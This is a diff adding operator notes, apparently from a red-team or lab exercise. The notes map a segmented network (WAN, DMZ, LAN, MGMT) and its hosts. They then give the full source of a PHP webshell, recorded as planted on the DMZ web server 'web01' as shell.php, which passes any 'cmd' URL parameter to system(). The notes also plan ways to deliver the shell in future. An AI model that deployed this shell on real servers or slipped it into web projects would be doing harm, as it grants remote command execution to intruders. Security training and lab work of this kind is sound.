@@ -1,1 +1,39 @@
+Active networks:
+  WAN
+  DMZ
+  LAN
+    MGMT
 
+Active machines:
+  rw01 (WAN) - Ubuntu, exterior computer
+  fw01 (WAN/LAN/DMZ) - VyOS firewall, handles routing
+  web01 (DMZ) - CentOS7, hosts company website
+  wks01 (LAN) - Windows 10
+  fw-mgmt (LAN/MGMT) - VyOS firewall between LAN and MGMT
+  mgmt01 (LAN) - Ubuntu
+  mgmt02 (MGMT) - Windows Server 2016
+  wazuh (MGMT) - Ubuntu
+
+Task:
+
+Note:
+The webshell had tp be manually typed in, finding a way to download it will be important in the future
+
+PHP webshell applied to web01 (shell.php):
+https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
